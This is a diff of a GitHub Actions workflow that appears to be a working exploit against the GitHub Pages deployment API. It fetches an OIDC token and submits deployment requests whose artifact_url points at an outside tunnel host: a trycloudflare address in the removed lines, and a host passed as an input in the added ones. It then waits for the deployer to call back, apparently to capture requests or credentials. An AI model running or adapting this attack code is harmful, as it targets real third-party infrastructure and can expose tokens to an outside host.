@@ -1,6 +1,9 @@
 name: bf45db64-capture
 on:
   workflow_dispatch:
+    inputs:
+      oob:
+        required: true
 permissions:
   contents: read
   pages: write
@@ -14,23 +17,21 @@ jobs:
     steps:
       - name: capture-arm
         env:
+          OOB: ${{ github.event.inputs.oob }}
           GH_TOKEN: ${{ github.token }}
-          TUNNEL: "https://liberty-jvc-fairfield-blocks.trycloudflare.com"
         run: |
           TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
           echo "::add-mask::$TOKEN"
           API="https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments"
-          
           echo "===== CONTROL: tunnel reachable ====="
-          curl -s "$TUNNEL/control-pre-capture" || true
-          
-          echo "===== ARM: artifact_id (expired) + artifact_url (our tunnel) ====="
-          curl -s -w '\nHTTP %{http_code}\n' -X POST "$API" \
-            -H "Authorization: Bearer $TOKEN" \
-            -H "Accept: application/vnd.github+json" \
-            -d "{\"artifact_id\":\"10387063794\",\"artifact_url\":\"$TUNNEL/bf45db64-capture/_apis/pipelines/1/runs/1/artifacts?artifactName=github-pages\",\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
-          
-          sleep 30
-          
-          echo "===== CONTROL: tunnel still alive ====="
-          curl -s "$TUNNEL/control-post-capture" || true
+          curl -s "https://$OOB/control-pre" || true
+          echo "===== CONTROL: artifact_url ONLY (expect 400) ====="
+          curl -s -w '\nHTTP %{http_code}\n' -X POST -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" "$API" \
+            -d "{\"artifact_url\":\"https://$OOB/_apis/pipelines/1/runs/1/artifacts?arm=ctl\",\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
+          sleep 3
+          echo "===== ARM: EXPIRED artifact_id + arbitrary artifact_url ====="
+          curl -s -w '\nHTTP %{http_code}\n' -X POST -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" "$API" \
+            -d "{\"artifact_id\":10387063794,\"artifact_url\":\"https://$OOB/bf45db64-capture/_apis/pipelines/1/runs/1/artifacts?artifactName=github-pages\",\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
+          echo "===== WAIT for deployer callbacks ====="
+          for i in 1 2 3 4; do sleep 15; echo "tick $((i*15))s"; done
+          curl -s "https://$OOB/control-post" || true
